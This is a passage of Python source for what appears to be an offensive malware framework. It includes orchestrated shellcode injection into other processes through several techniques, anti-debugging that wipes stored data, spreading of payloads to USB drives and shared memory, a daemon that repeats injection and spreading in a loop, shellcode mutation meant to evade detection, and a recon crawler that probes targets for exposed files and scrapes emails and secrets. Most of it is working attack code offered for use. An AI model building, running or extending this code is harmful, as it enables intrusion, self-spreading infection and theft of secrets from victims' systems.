        MITRE T1055: Windows Hook Injection (SetWindowsHookEx).
        
        Hook-based injection technique:
        1. Create .dll from shellcode in memory
        2. Set global Windows hook (WH_GETMESSAGE, WH_CALLWNDPROC, etc.)
        3. Trigger message loop in target process
        4. Hook routine executes shellcode
        
        Note: This requires DLL encapsulation of shellcode, simplified here.
        
        Args:
            pid: Target process ID.
            shellcode: Shellcode to inject.
            
        Returns:
            bool: True if injection successful (currently limited).
        """
        if platform.system() != "Windows":
            return False
        
        try:
            self.logger.debug(f"Attempting Windows Hook injection for PID {pid}")
            
            # Windows Hook injection requires DLL creation, which is complex
            # This is a skeleton for integrated hook-based injection
            self.logger.debug("Windows Hook injection: Requires DLL wrapper (limited implementation)")
            return False
            
        except Exception as e:
            self.logger.debug(f"Windows Hook injection failed: {e}")
            return False
    
    def _inject_via_atom_bombing(self, pid: int, shellcode: bytes) -> bool:
        """
        MITRE T1055: Atom Bombing.
        
        Atom Bombing technique:
        1. Create global atom table entry with shellcode 
        2. PostMessage to target window with custom message
        3. Target process copies atom content
        4. Exploit copy operation to execute shellcode
        
        Note: This is a sophisticated technique requiring window targeting.
        
        Args:
            pid: Target process ID.
            shellcode: Shellcode to inject.
            
        Returns:
            bool: True if injection successful (currently limited).
        """
        if platform.system() != "Windows":
            return False
        
        try:
            self.logger.debug(f"Attempting Atom Bombing for PID {pid}")
            kernel32 = ctypes.windll.kernel32
            
            # Atom bombing requires finding window associated with PID and atom manipulation
            # This is advanced and requires custom PostMessage handling
            self.logger.debug("Atom Bombing: Requires window targeting and atom heap manipulation (limited)")
            return False
            
        except Exception as e:
            self.logger.debug(f"Atom Bombing failed: {e}")
            return False
    
    def _inject_into_pid_windows_advanced(self, pid: int, shellcode: bytes) -> bool:
        """
        Advanced Windows injection orchestrator.
        
        Attempts multiple sophisticated injection techniques in sequence:
        1. Process Hollowing
        2. APC Injection
        3. Thread Hijacking
        4. NtCreateThreadEx
        5. Standard CreateRemoteThread (fallback)
        
        This provides defense-in-depth through technique diversity.
        
        Args:
            pid: Target process ID.
            shellcode: Decrypted shellcode.
            
        Returns:
            bool: True if any technique succeeds.
        """
        techniques = [
            ("Process Hollowing", self._inject_process_hollowing),
            ("APC Injection", self._inject_apc_injection),
            ("Thread Hijacking", self._inject_thread_hijacking),
            ("NtCreateThreadEx", self._inject_nt_create_thread_ex),
        ]
        
        errors = []
        
        for technique_name, technique_func in techniques:
            try:
                self.logger.debug(f"Attempting {technique_name} injection for PID {pid}...")
                if technique_func(pid, shellcode):
                    self.logger.info(f"Advanced Windows injection successful via {technique_name}")
                    return True
            except Exception as e:
                error_msg = f"{technique_name}: {str(e)}"
                errors.append(error_msg)
                self.logger.debug(f"Advanced technique {technique_name} failed: {e}")
        
        # Fallback to standard CreateRemoteThread
        try:
            self.logger.debug("Falling back to standard CreateRemoteThread injection...")
            return self._inject_into_pid_windows(pid, shellcode)
        except Exception as e:
            self.logger.error(f"All advanced injection techniques failed, including CreateRemoteThread fallback: {e}")
            return False

    def inject_into_pid(self, pid: int, encrypted_shellcode: bytes, target_url: Optional[str] = None) -> None:
        """
        Injects encrypted shellcode into a target process, optionally using recon data.
        
        Args:
            pid: Target process ID.
            encrypted_shellcode: Encrypted shellcode to inject.
            target_url: Optional URL from recon data to associate with injection.
        
        Raises:
            RuntimeError: If injection fails.
        """
        try:
            decrypted = self.decrypt_shellcode(encrypted_shellcode)
            
            # Validate shellcode before injection (NEW)
            if not self._validate_shellcode(decrypted):
                raise RuntimeError("Shellcode validation failed - may be corrupted or invalid")
            self.logger.info(f"Injecting {len(decrypted)} bytes into PID {pid}...")
            
            # Check privilege requirements (NEW - HIGH PRIORITY)
            if platform.system() == "Windows":
                # Check for SeDebugPrivilege on Windows
                if not self._has_sedebug_privilege():
                    self.logger.error("Insufficient privileges: SeDebugPrivilege required (run as Administrator)")
                    raise RuntimeError("Insufficient privileges: SeDebugPrivilege not available")
            elif platform.system() == "Linux":
                # Check for ptrace capabilities on Linux
                if hasattr(os, 'geteuid') and os.geteuid() != 0 and not self._has_ptrace_capability():  # type: ignore
                    self.logger.warning("Limited ptrace access: injection may fail on protected processes")
            
            if platform.system() == "Windows":
                # Use advanced Windows injection with multiple MITRE T1055 techniques
                # Attempts: Process Hollowing → APC Injection → Thread Hijacking → NtCreateThreadEx → CreateRemoteThread
                success = self._inject_into_pid_windows_advanced(pid, decrypted)
                if not success:
                    raise RuntimeError("All advanced Windows injection techniques failed")
            elif platform.system() == "Linux":
                # Use multi-strategy Linux injection with fallbacks
                self._inject_into_pid_linux(pid, decrypted)
            else:
                raise RuntimeError(f"Unsupported platform: {platform.system()}")
            
            result = {"pid": pid, "success": True, "url": target_url}
            self.vault.store(f"injection_result_{pid}_{time.time()}", json.dumps(result).encode())
        except Exception as e:
            self.logger.error(f"Injection into PID {pid} failed: {e}")
            self.vault.store(f"injection_error_{time.time()}", 
                            json.dumps({"pid": pid, "error": str(e), "url": target_url}).encode())
            raise RuntimeError(f"Injection failed: {e}")

    def anti_debug_check(self) -> None:
        """
        Checks for debugger presence and triggers vault wipe if detected.
        
        Raises:
            RuntimeError: If debugger is detected.
        """
        try:
            if platform.system() == "Windows":
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    self.vault.wipe_all()
                    self.logger.warning("Debugger detected, vault wiped")
                    raise RuntimeError("Debugger detected")
            elif platform.system() == "Linux":
                with open("/proc/self/status", "r") as f:
                    if "TracerPid: 0" not in f.read():
                        self.vault.wipe_all()
                        self.logger.warning("Debugger detected, vault wiped")
                        raise RuntimeError("Debugger detected")
            elif os.getenv("DEBUG") == "1":
                self.vault.wipe_all()
                self.logger.warning("Debug environment detected, vault wiped")
                raise RuntimeError("Debug environment detected")
        except Exception as e:
            self.logger.error(f"Anti-debug check failed: {e}")
            raise RuntimeError(f"Anti-debug check failed: {e}")

    def spread_via_usb(self, payload_name: str) -> None:
        """
        Copies a payload from BlackVault to a USB drive if detected.
        
        Args:
            payload_name: Name of the payload in BlackVault.
        
        Raises:
            RuntimeError: If USB is not found or copy fails.
        """
        usb_paths = []
        if platform.system() == "Windows":
            if HAS_WIN32:
                try:
                    drives = win32api.GetLogicalDriveStrings().split('\0')[:-1]  # type: ignore
                    def get_drive_type(d: str) -> int:
                        try:
                            return win32file.GetDriveType(d)  # type: ignore
                        except Exception:
                            return -1
                    usb_paths = [d for d in drives if get_drive_type(d) == win32file.DRIVE_REMOVABLE]  # type: ignore
                except Exception as e:
                    self.logger.warning(f"USB detection error: {e}")
            else:
                self.logger.warning("pywin32 not installed, skipping USB detection on Windows")
        elif platform.system() == "Linux":
            try:
                usb_paths = [os.path.join("/media", user, d) 
                            for user in os.listdir("/media") 
                            for d in os.listdir(os.path.join("/media", user))]
            except FileNotFoundError:
                self.logger.warning("No /media directory found, skipping USB detection on Linux")

        if not usb_paths:
            self.logger.error("No USB drives detected")
            raise RuntimeError("No USB drives found")

        try:
            payload = self.vault.retrieve(payload_name)
            for usb_path in usb_paths:
                dest = os.path.join(usb_path, f"payload_{time.time()}.bin")
                with open(dest, "wb") as f:
                    f.write(payload)
                self.logger.info(f"Payload copied to USB: {dest}")
                self.vault.store(f"usb_spread_{time.time()}", 
                                json.dumps({"path": dest, "success": True}).encode())
        except Exception as e:
            self.logger.error(f"USB spread failed: {e}")
            self.vault.store(f"usb_spread_error_{time.time()}", 
                            json.dumps({"error": str(e)}).encode())
            raise RuntimeError(f"USB spread failed: {e}")

    def spread_via_shared_memory(self, payload_name: str) -> None:
        """
        Stores a payload in shared memory for inter-process communication.
        
        Args:
            payload_name: Name of the payload in BlackVault.
        
        Raises:
            RuntimeError: If shared memory operation fails.
        """
        try:
            payload = self.vault.retrieve(payload_name)
            with mmap.mmap(-1, len(payload), tagname=f"blackroot_payload_{time.time()}") as mm:
                mm.write(payload)
                self.logger.info(f"Payload stored in shared memory ({len(payload)} bytes)")
                self.vault.store(f"shared_memory_spread_{time.time()}", 
                                json.dumps({"size": len(payload), "success": True}).encode())
        except Exception as e:
            self.logger.error(f"Shared memory spread failed: {e}")
            self.vault.store(f"shared_memory_error_{time.time()}", 
                            json.dumps({"error": str(e)}).encode())
            raise RuntimeError(f"Shared memory spread failed: {e}")

class GhostLayerDaemon:
    """Runs continuous GhostLayer operations with recon-driven targets."""
    
    def __init__(self, ghost_layer: 'GhostLayer', vault: Any):
        """
        Initializes the daemon with a GhostLayer and BlackVault instance.
        
        Args:
            ghost_layer: GhostLayer instance.
            vault: BlackVault instance for storing results.
        """
        self.ghost_layer = ghost_layer
        self.vault = vault
        self.logger = logging.getLogger('GhostLayerDaemon')
        self.running = False

    def run(self, target: Optional[str] = None):
        """
        Runs the daemon, using recon data to select targets.
        
        Args:
            target: Optional target URL for recon-driven operations.
        """
        self.running = True
        endpoints = []
        if target:
            try:
                recon_data = self.ghost_layer.load_recon_data(target)
                endpoints = recon_data.get('endpoints', [])
            except Exception as e:
                self.logger.error(f"Failed to load recon data: {e}")
        
        while self.running:
            try:
                self.ghost_layer.anti_debug_check()
                pid = self.ghost_layer.find_target_process()
                self.ghost_layer.load_shellcode("ghost_payload")
                encrypted_shellcode = self.ghost_layer.encrypt_shellcode()
                target_url = random.choice(endpoints) if endpoints else None
                self.ghost_layer.inject_into_pid(pid, encrypted_shellcode, target_url)
                self.ghost_layer.spread_via_usb("ghost_payload")
                self.ghost_layer.spread_via_shared_memory("ghost_payload")
            except Exception as e:
                self.logger.error(f"Operation failed: {e}")
                self.vault.store(f"daemon_error_{time.time()}", 
                                json.dumps({"error": str(e)}).encode())
            time.sleep(60)

    def stop(self):
        """Stops the daemon."""
        self.running = False
        self.logger.info("GhostLayerDaemon stopped")

class SelfLearningInjection:
    """Applies heuristic-based mutations to shellcode."""
    
    def __init__(self, vault: Any):
        """
        Initializes with heuristics and a BlackVault instance.
        
        Args:
            vault: BlackVault instance for storing mutation metadata.
        """
        self.vault = vault
        self.logger = logging.getLogger('SelfLearningInjection')
        self.heuristics = [
            {"technique": "randomize_nops", "probability": 0.5},
            {"technique": "change_instruction_order", "probability": 0.3},
            {"technique": "insert_obfuscated_strings", "probability": 0.2}
        ]

    def apply_heuristics(self, shellcode: bytes) -> bytes:
        """
        Applies random heuristics to mutate shellcode.
        
        Args:
            shellcode: Input shellcode.
        
        Returns:
            bytes: Mutated shellcode.
        """
        try:
            mutated = shellcode
            applied_techniques = []
            for heuristic in self.heuristics:
                if random.random() < heuristic["probability"]:
                    mutated = self._apply_technique(mutated, heuristic["technique"])
                    applied_techniques.append(heuristic["technique"])
            self.vault.store(f"mutation_{time.time()}", 
                            json.dumps({"techniques": applied_techniques}).encode())
            self.logger.info(f"Applied heuristics, mutated shellcode to {len(mutated)} bytes")
            return mutated
        except Exception as e:
            self.logger.error(f"Heuristic application failed: {e}")
            self.vault.store(f"mutation_error_{time.time()}", 
                            json.dumps({"error": str(e)}).encode())
            raise ValueError(f"Heuristic application failed: {e}")

    def _apply_technique(self, shellcode: bytes, technique: str) -> bytes:
        """Applies a specific mutation technique."""
        if technique == "randomize_nops":
            return self._randomize_nops(shellcode)
        elif technique == "change_instruction_order":
            return self._change_instruction_order(shellcode)
        elif technique == "insert_obfuscated_strings":
            return self._insert_obfuscated_strings(shellcode)
        return shellcode

    def _randomize_nops(self, shellcode: bytes) -> bytes:
        """Inserts random NOPs into shellcode."""
        mutated = bytearray(shellcode)
        for _ in range(random.randint(1, 5)):
            pos = random.randint(0, len(mutated) - 1)
            mutated.insert(pos, 0x90)
        return bytes(mutated)

    def _change_instruction_order(self, shellcode: bytes) -> bytes:
        """
        Shuffles instruction blocks, preserving functionality for specific patterns.
        """
        try:
            instructions = [shellcode[i:i+4] for i in range(0, len(shellcode), 4)]
            safe_instructions = [i for i in instructions if i != b"\x90\x90\x90\x90"]
            random.shuffle(safe_instructions)
            nop_count = len(instructions) - len(safe_instructions)
            return b''.join(safe_instructions + [b"\x90\x90\x90\x90"] * nop_count)
        except Exception as e:
            self.logger.error(f"Instruction order mutation failed: {e}")
            return shellcode

    def _insert_obfuscated_strings(self, shellcode: bytes) -> bytes:
        """Appends an obfuscated string with metadata."""
        try:
            string = f"blackroot_{time.time()}"
            obfuscated = self.obfuscate_string(string)
            return shellcode + b"\x00" + obfuscated
        except Exception as e:
            self.logger.error(f"String obfuscation failed: {e}")
            return shellcode

    def obfuscate_string(self, s: str) -> bytes:
        """Obfuscates a string with XOR."""
        key = 0x55
        return bytes([b ^ key for b in s.encode()])

class GhostHive:
    """Manages multiple GhostLayer instances with recon-driven operations."""
    
    def __init__(self, agents: List['GhostLayer'], vault: Any):
        """
        Initializes with a list of GhostLayer agents and a BlackVault instance.
        
        Args:
            agents: List of GhostLayer instances.
            vault: BlackVault instance for storing results.
        """
        self.agents = agents
        self.vault = vault
        self.logger = logging.getLogger('GhostHive')

    def run(self, target: Optional[str] = None):
        """
        Runs all GhostLayer agents with optional recon-driven targets.
        
        Args:
            target: Optional target URL for recon-driven operations.
        """
        threads = []
        try:
            for agent in self.agents:
                if target:
                    agent.load_recon_data(target)
                thread = threading.Thread(target=self._run_agent, args=(agent, target), daemon=True)
                thread.start()
                threads.append(thread)
                self.logger.info(f"Started GhostLayer agent")
            for thread in threads:
                thread.join()
        except Exception as e:
            self.logger.error(f"GhostHive run failed: {e}")
            self.vault.store(f"ghosthive_error_{time.time()}", 
                            json.dumps({"error": str(e)}).encode())

    def _run_agent(self, agent: 'GhostLayer', target: Optional[str]):
        """Runs a single GhostLayer agent."""
        try:
            agent.anti_debug_check()
            pid = agent.find_target_process()
            agent.load_shellcode("ghost_payload")
            encrypted = agent.encrypt_shellcode()
            target_url = random.choice(agent.recon_data.get('endpoints', [])) if agent.recon_data else None
            agent.inject_into_pid(pid, encrypted, target_url)
            agent.spread_via_usb("ghost_payload")
            agent.spread_via_shared_memory("ghost_payload")
        except Exception as e:
            self.logger.error(f"Agent run failed: {e}")
            self.vault.store(f"agent_error_{time.time()}", 
                            json.dumps({"error": str(e)}).encode())

# Recon module (integrated from provided code, with BlackVault storage)
def advanced_recon(target: str, max_depth: int = 3, scope_domains: Optional[List[str]] = None, 
                  brute_subdomains: bool = True) -> dict:
    """
    Performs advanced reconnaissance, storing results in BlackVault.
    
    Args:
        target: Target URL.
        max_depth: Maximum crawl depth.
        scope_domains: List of domains to scope the crawl.
        brute_subdomains: Enable subdomain brute-forcing.
    
    Returns:
        dict: Recon report.
    """
    logger = logging.getLogger('Recon')
    visited = set()
    endpoints = set()
    forms = []
    js_endpoints = set()
    emails = set()
    secrets = set()
    tech = set()
    subdomains = set()
    report = {}

    if not scope_domains:
        parsed = urlparse(target)
        scope_domains = [parsed.netloc]

    if brute_subdomains:
        logger.info("Enumerating subdomains...")
        for dom in scope_domains:
            found = set()
            found.update(get_subdomains(dom))
            found.update(fetch_crtsh_subdomains(dom))
            found.update(fetch_certspotter_subdomains(dom))
            found.update(dnstwist_permutations(dom))
            subdomains.update(found)
        report['subdomains'] = list(subdomains)
    
    logger.info("Brute-forcing common directories...")
    report['brute_dirs'] = brute_force_paths(target)

    def crawl(url: str, depth: int):
        if url in visited or depth > max_depth:
            return
        url_padded = random_query_pad(url)
        headers = get_random_headers()
        visited.add(url)
        backoff = 0
        try:
            start = time.time()
            r = requests.get(url_padded, headers=headers, timeout=8, verify=False)
            elapsed = time.time() - start
            if r.status_code in (403, 503) or elapsed > 10:
                logger.warning(f"WAF anomaly: {url} status={r.status_code} delay={elapsed:.1f}s")
                backoff = random.uniform(2, 10)
            retry_after = r.headers.get('Retry-After', '0')
            try:
                backoff = max(backoff, float(retry_after))
            except Exception:
                pass
            logger.info(f"Rate limit detected. Backing off for {backoff:.1f}s") if retry_after != '0' else None
            xrlr = r.headers.get('X-RateLimit-Reset', '0')
            try:
                reset_time = float(xrlr)
                backoff = max(backoff, max(0, reset_time - time.time()))
                logger.info(f"Rate limit detected. Backing off for {backoff:.1f}s") if xrlr != '0' else None
            except Exception:
                pass
            if backoff > 0:
                time.sleep(backoff + random.uniform(0.5, 2.5))
            
            soup = BeautifulSoup(r.text, "html.parser")
            html = r.text
            endpoints.add(url)
            emails.update(extract_emails(html))
            secrets.update(extract_secrets(html))
            tech.update(fingerprint_tech(r.headers, html))
            
            if url.endswith("robots.txt"):
                for p in parse_robots(html, url):
                    crawl(p, depth + 1)
            if url.endswith("sitemap.xml"):
                for loc in parse_sitemap(html):
                    crawl(loc, depth + 1)
            
            for form in soup.find_all("form"):
                if not isinstance(form, Tag):
                    continue
                action = form.get("action") or url
                method = str(form.get("method", "get")).lower()
                inputs = [inp for inp in form.find_all("input") if isinstance(inp, Tag)]
                forms.append({
                    'url': url,
                    'action': action,
                    'method': method,
                    'inputs': [inp.get('name') for inp in inputs if inp.get('name')]
                })
            
            for script in soup.find_all("script"):
                if isinstance(script, Tag):
                    src = script.get("src")
                    if src and isinstance(src, str) and src.startswith("http"):
                        js_endpoints.add(src)
                    if script.string:
                        js_endpoints.update(re.findall(r'https?://[\w\./\-_%]+', script.string))
            
            for link in soup.find_all("a"):
                if not isinstance(link, Tag):
                    continue
                href = link.get("href")
                if href:
                    absolute = urljoin(url, str(href))
                    if any(domain in absolute for domain in scope_domains):
                        crawl(absolute, depth + 1)
        except Exception as e:
            logger.error(f"Crawl failed for {url}: {e}")
            time.sleep(random.uniform(2, 10) + random.uniform(0.5, 2.5))

    for path in COMMON_PATHS:
        crawl(urljoin(target, path), 1)
    crawl(target, 1)

    report['endpoints'] = list(endpoints)
    report['forms'] = forms
    report['js_endpoints'] = list(js_endpoints)
    report['emails'] = list(emails)
    report['secrets'] = list(secrets)
    report['technologies'] = list(tech)
    
    logger.info(f"Recon complete: {len(endpoints)} endpoints, {len(forms)} forms, {len(js_endpoints)} JS endpoints")
    return report

# --- Helper stubs and constants for recon ---
COMMON_PATHS = [
    '/', '/robots.txt', '/sitemap.xml', '/admin', '/login', '/dashboard', '/api', '/.git', '/.env', '/config', '/wp-admin', '/wp-login.php'
]

def get_subdomains(domain):
    """
    Fetch subdomains from multiple sources (crt.sh, certspotter, DNS permutations).
    
    Args:
        domain: Domain to enumerate subdomains for.
        
    Returns:
        set: Set of discovered subdomains.
    """
    subdomains = set()
    try:
        # Try crt.sh API
        subdomains.update(fetch_crtsh_subdomains(domain))
    except Exception as e:
        logging.debug(f"crt.sh enumeration failed: {e}")
    
    try:
        # Try certspotter API
        subdomains.update(fetch_certspotter_subdomains(domain))
    except Exception as e:
        logging.debug(f"certspotter enumeration failed: {e}")
    
    try:
        # Generate DNS permutations
        subdomains.update(dnstwist_permutations(domain))
    except Exception as e:
        logging.debug(f"DNS permutation generation failed: {e}")
    
    return subdomains

def fetch_crtsh_subdomains(domain):
    """
    Query crt.sh (Certificate Transparency logs) for subdomains.
    
    Args:
        domain: Domain to query.
        
    Returns:
        set: Subdomains found in CT logs.
    """
    subdomains = set()
    try:
        url = f"https://crt.sh/?q=%25.{domain}&output=json"
        response = requests.get(url, timeout=10, verify=False)
        if response.status_code == 200:
            certs = response.json()
            for cert in certs:
                # crt.sh returns name_value field with comma-separated domains
                names = cert.get('name_value', '').split('\n')
                for name in names:
                    name = name.strip().lower()
                    if name and domain in name:
                        # Remove wildcards
                        name = name.replace('*.', '')
                        subdomains.add(name)
    except Exception as e:
        logging.debug(f"crt.sh fetch failed: {e}")
    
    return subdomains

def fetch_certspotter_subdomains(domain):
    """
    Query Certspotter (Certificate Transparency) API for subdomains.
    
    Args:
        domain: Domain to query.
        
    Returns:
        set: Subdomains found in Certspotter.
    """
    subdomains = set()
    try:
        url = f"https://certspotter.com/api/v1/issuances?domain={domain}&include_subdomains=true&expand=dns_names"
        response = requests.get(url, timeout=10, verify=False)
        if response.status_code == 200:
            issuances = response.json()
            for issuance in issuances:
                dns_names = issuance.get('dns_names', [])
                for name in dns_names:
                    name = name.strip().lower()
                    if name and domain in name:
                        name = name.replace('*.', '')
                        subdomains.add(name)
    except Exception as e:
        logging.debug(f"certspotter fetch failed: {e}")
    
    return subdomains

def dnstwist_permutations(domain):
    """
    Generate DNS permutations for a domain (typosquatting patterns).
    
    Generates permutations like:
    - Character swaps (e.g., acme.com -> amce.com)
    - Missing characters (e.g., acme.com -> ame.com)
    - Extra characters (e.g., acme.com -> aacme.com)
    - Character repetitions (e.g., acme.com -> aacme.com)
    
    Args:
        domain: Domain to generate permutations for.
        
    Returns:
        set: Permutation variants (not necessarily valid).
    """
    permutations = set()
    domain_parts = domain.split('.')
    
    if len(domain_parts) < 2:
        return permutations
    
    sld = domain_parts[0]  # Second-level domain
    tld = '.'.join(domain_parts[1:])
    
    # Character swaps (adjacent characters)
    for i in range(len(sld) - 1):
        swapped = sld[:i] + sld[i+1] + sld[i] + sld[i+2:]
        permutations.add(f"{swapped}.{tld}")
    
    # Missing characters
    for i in range(len(sld)):
        missing = sld[:i] + sld[i+1:]
        if missing:
            permutations.add(f"{missing}.{tld}")
    
    # Extra characters (common typos)
    common_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    for i in range(len(sld) + 1):
        for char in common_chars:
            extra = sld[:i] + char + sld[i:]
            if len(extra) <= 20:  # Reasonable limit
                permutations.add(f"{extra}.{tld}")
    
    # Character substitutions (common typos)
    substitutions = {
        'a': ['e', 'o'], 'e': ['a', 'i'], 'i': ['e', 'o'], 'o': ['a', 'e', 'u'],
        'u': ['o', 'a'], 'l': ['1', 'i'], 'o': ['0'], '1': ['l', 'i'],
        's': ['5', 'z'], 'z': ['s', '2'], '5': ['s'], '0': ['o']
    }
    
    for i, char in enumerate(sld):
        for sub in substitutions.get(char, []):
            substituted = sld[:i] + sub + sld[i+1:]
            permutations.add(f"{substituted}.{tld}")
    
    return permutations

def brute_force_paths(target):
    """
    Brute-force common paths on target URL.
    
    Attempts to access common paths and returns those that respond with
    status codes indicating success or interesting responses (not 404).
    
    Args:
        target: Target URL (e.g., "http://example.com").
        
    Returns:
        list: List of discovered paths with successful responses.
    """
    discovered_paths = []
    
    # Expanded common paths list
    paths_to_try = [
        '/', '/index.html', '/index.php',
        '/admin', '/admin/', '/admin/login', '/admin/index.php',
        '/login', '/login.php', '/signin', '/user/login',
        '/dashboard', '/dashboard/', '/panel',
        '/api', '/api/v1', '/api/v2', '/rest', '/graphql',
        '/.git', '/.git/config', '/.gitignore',
        '/.env', '/.env.local', '/.env.example',
        '/config', '/config.php', '/configuration.php', '/settings.php',
        '/wp-admin', '/wp-login.php', '/wp-content',
        '/phpmyadmin', '/adminer', '/dbadmin',
        '/.well-known/security.txt', '/.well-known/assetlinks.json',
        '/backup', '/backups', '/old', '/tmp', '/test',
        '/upload', '/uploads', '/download', '/downloads',
        '/status', '/health', '/ping',
        '/version', '/VERSION', '/build.txt', '/release.txt',
        '/swagger', '/swagger.json', '/swagger-ui', '/openapi.json',
        '/actuator', '/actuator/health',
        '/.DS_Store', '/web.config', '/server-status',
    ]
    
    headers = get_random_headers()
    
    for path in paths_to_try:
        try:
            url = f"{target.rstrip('/')}{path}"
            response = requests.head(url, headers=headers, timeout=5, verify=False, allow_redirects=False)
            
            # Status codes indicating success or interesting response
            if response.status_code in [200, 201, 301, 302, 401, 403, 500, 502, 503]:
                discovered_paths.append({
                    'path': path,
                    'status': response.status_code,
                    'length': len(response.content) if response.status_code == 200 else 0
                })
        except Exception as e:
            logging.debug(f"Path brute-force for {target}{path} failed: {e}")
    
    return discovered_paths

def random_query_pad(url):
    # Appends a random query param to bypass caches
    return url + ("&" if "?" in url else "?") + f"r={random.randint(1000,9999)}"

def get_random_headers():
    # Returns random headers for requests
    return {"User-Agent": f"ReconBot/{random.randint(1,10)}"}

def fingerprint_tech(headers, html):
    """
    Fingerprint web technologies from HTTP headers and HTML content.
    
    Detects: Web servers, frameworks, CMS platforms, libraries, and more.
    
    Args:
        headers: HTTP response headers (dict).
        html: HTML response body (string).
        
    Returns:
        set: Detected technology names.
    """
    tech_detected = set()
    
    # Server headers
    server_header = headers.get('Server', '').lower()
    if server_header:
        if 'apache' in server_header:
            tech_detected.add('Apache')
        if 'nginx' in server_header:
            tech_detected.add('Nginx')
        if 'microsoft-iis' in server_header or 'iis' in server_header:
            tech_detected.add('IIS')
        if 'tomcat' in server_header:
            tech_detected.add('Tomcat')
        if 'lighttpd' in server_header:
            tech_detected.add('Lighttpd')
    
    # Framework detection from headers
    x_powered_by = headers.get('X-Powered-By', '').lower()
    if x_powered_by:
        tech_detected.add(x_powered_by.title())
    
    x_framework = headers.get('X-Framework', '').lower()
    if x_framework:
        tech_detected.add(x_framework.title())
    
    # CMS and Framework detection from HTML
    html_lower = html.lower()
    
    # WordPress
    if '/wp-content/' in html_lower or '/wp-includes/' in html_lower:
        tech_detected.add('WordPress')
    if 'wp_version' in html_lower:
        version_match = re.search(r'wp_version\s*=\s*["\']([^"\']+)["\']', html_lower)
        if version_match:
            tech_detected.add(f"WordPress {version_match.group(1)}")
    
    # Drupal
    if '/sites/all/modules/' in html_lower or 'drupal.settings' in html_lower:
        tech_detected.add('Drupal')
    
    # Joomla
    if 'joomla' in html_lower or '/components/com_' in html_lower:
        tech_detected.add('Joomla')
    
    # Magento
    if '/skin/' in html_lower and '/media/' in html_lower:
        if 'magento' in html_lower or 'mage' in html_lower:
            tech_detected.add('Magento')
    
    # Shopify
    if 'cdn.shopify.com' in html_lower or 'myshopify.com' in html_lower:
        tech_detected.add('Shopify')
    
    # Squarespace
    if 'squarespace' in html_lower or 'static.squarespace.com' in html_lower:
        tech_detected.add('Squarespace')
    
    # Angular, React, Vue
    if 'ng-app' in html_lower or 'angular' in html_lower:
        tech_detected.add('AngularJS')
    if '__react' in html_lower or 'react' in headers.get('X-Powered-By', '').lower():
        tech_detected.add('React')
    if '__vue' in html_lower or 'vue' in headers.get('X-Powered-By', '').lower():
        tech_detected.add('Vue.js')
    
    # jQuery
    if 'jquery' in html_lower:
        version_match = re.search(r'jquery[/\-._](\d+\.\d+\.\d+)', html_lower)
        if version_match:
            tech_detected.add(f"jQuery {version_match.group(1)}")
        else:
            tech_detected.add('jQuery')
    
    # Bootstrap
    if 'bootstrap' in html_lower and ('/css/bootstrap' in html_lower or '/js/bootstrap' in html_lower):
        tech_detected.add('Bootstrap')
    
    # Detect languages/frameworks in scripts and meta tags
    if '<generator' in html_lower:
        generator_match = re.search(r'<generator[^>]*content=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if generator_match:
            tech_detected.add(generator_match.group(1))
    
    # Meta charset (sometimes gives clues)
    charset_match = re.search(r'charset=["\']?([^"\'>\s]+)', html, re.IGNORECASE)
    if charset_match:
        tech_detected.add(f"Charset: {charset_match.group(1)}")
    
    return tech_detected

def extract_emails(html):
    """
    Extract email addresses from HTML content with improved regex pattern.
    
    Args:
        html: HTML content.
        
    Returns:
        set: Email addresses found.
    """
    emails = set()
    # Enhanced regex: handles most common email formats
    pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    found = re.findall(pattern, html)
    emails.update(found)
    return emails

def extract_secrets(html):
    """
    Extract potential secrets (API keys, tokens, passwords) from HTML.
    
    Detects: API keys, access tokens, private keys, passwords in HTML/JS.
    
    Args:
        html: HTML/JavaScript content.
        
    Returns:
        set: Potential secrets found.
    """
    secrets = set()
    
    # API keys and tokens
    patterns = [
        r'["\']?(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9\-_\.]{20,})["\']?',
        r'["\']?(?:access[_-]?token|token)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9\-_\.]{20,})["\']?',
        r'["\']?(?:secret[_-]?key|secret)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9\-_\.]{20,})["\']?',
        r'["\']?(?:authorization|auth)["\']?\s*[:=]\s*["\']?(Bearer\s+[a-zA-Z0-9\-_\.]+)["\']?',
        r'["\']?(?:password|pwd)["\']?\s*[:=]\s*["\']?([^\s"\']{6,})["\']?',
        r'["\']?(?:private[_-]?key|private_key)["\']?\s*[:=]\s*["\']?(-----BEGIN[^"\']+)["\']?',
        r'(?:algolia|stripe|github|slack)[_-]?(?:api|key)[\'"]*?\s*[:=]\s*[\'"]?([a-zA-Z0-9_\-]{20,})',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, html, re.IGNORECASE)
        secrets.update(matches)
    
    return secrets

def parse_robots(html, base_url):
    """
    Parse robots.txt content and extract Disallow/Allow paths.
    
    Args:
        html: robots.txt content as string.
        base_url: Base URL to resolve relative paths against.
        
    Returns:
        list: Absolute URLs for discovered paths.
    """
    paths = []
    
    for line in html.splitlines():
        line = line.strip()
        
        # Skip comments and empty lines
        if not line or line.startswith('#'):
            continue
        
        # Parse Disallow and Allow directives
        if line.lower().startswith('disallow:'):
            path = line.split(':', 1)[1].strip()
            if path:
                paths.append(urljoin(base_url, path))
        
        elif line.lower().startswith('allow:'):
            path = line.split(':', 1)[1].strip()
            if path:
                paths.append(urljoin(base_url, path))
        
        elif line.lower().startswith('sitemap:'):
            # Sitemap directive
            sitemap_url = line.split(':', 1)[1].strip()
            if sitemap_url:
                paths.append(sitemap_url)
    
    return paths

def parse_sitemap(html):
    """
    Parse sitemap.xml (or sitemap index) and extract URLs.
    
    Handles both regular sitemaps and sitemap index files.
    
    Args:
        html: Sitemap XML content as string.
        
    Returns:
        list: URLs found in sitemap.
    """
    urls = []
    
    # Extract <loc> tags (works for both sitemap and sitemap index)
    loc_pattern = r'<loc[^>]*>([^<]+)</loc>'
    matches = re.findall(loc_pattern, html)
    
    for match in matches:
        url = match.strip()
        if url:
            urls.append(url)
    
    return urls